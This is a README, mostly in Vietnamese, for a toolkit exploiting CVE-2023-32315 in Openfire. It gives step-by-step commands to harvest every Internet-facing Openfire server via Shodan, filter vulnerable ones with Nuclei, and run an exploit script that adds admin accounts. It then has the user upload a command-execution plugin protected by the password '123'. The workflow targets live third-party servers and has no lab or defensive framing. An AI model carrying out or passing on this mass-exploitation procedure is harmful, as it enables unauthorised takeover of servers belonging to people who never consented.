# CVE-2023-32315
Openfire Console Authentication Bypass Vulnerability with RCE plugin

## Cài đặt
```
cd CVE-2023-32315
pip3 install -r requirements.txt
```

## Các bước tiến hành
1. Thu thập thông tin máy chủ:

- Sử dụng Shodan:
+ Đầu vào: file `shodan-query-CVE-2023-32315.py` (chỉnh sửa câu lệnh truy vấn cho phù hợp)
+ Đầu ra: file `nuclei-targets.txt` chứa tất cả các địa chỉ máy chủ Openfire trên Internet
```
python3 shodan-query-CVE-2023-32315.py
```
- Sử dụng Nuclei:
+ Đầu vào: `-l ./nuclei-targets.txt` File chứa địa chỉ máy chủ Openfire và`-t ./nuclei-CVE-2023-32315.yaml` file template nuclei
+ Đầu ra: file `targets.txt` chứa địa chỉ các máy chủ openfire có tồn tại lỗ hổng CVE-2023-32315
```
nuclei -l ./nuclei-targets.txt -t ./nuclei-CVE-2023-32315.yaml -o targets.txt -nm
```
2. Run exploit:
+ Đầu vào: file `exploit-CVE-2023-32315.py` file mã khai thác và `-l targets.txt` chứa danh sách máy chủ openfire có tồn tại lỗ hổng (cần chuẩn hóa lại danh sách từ đầu ra của nuclei)
+ Đầu ra: Username, password nếu khai thác thành công
```
python3 exploit-CVE-2023-32315.py -l targets.txt
```
3. login with newly added user
4. goto tab plugin > upload plugin `openfire-management-tool-plugin.jar`
5. goto tab server > server settings > Management tool > Pass plugin is "123"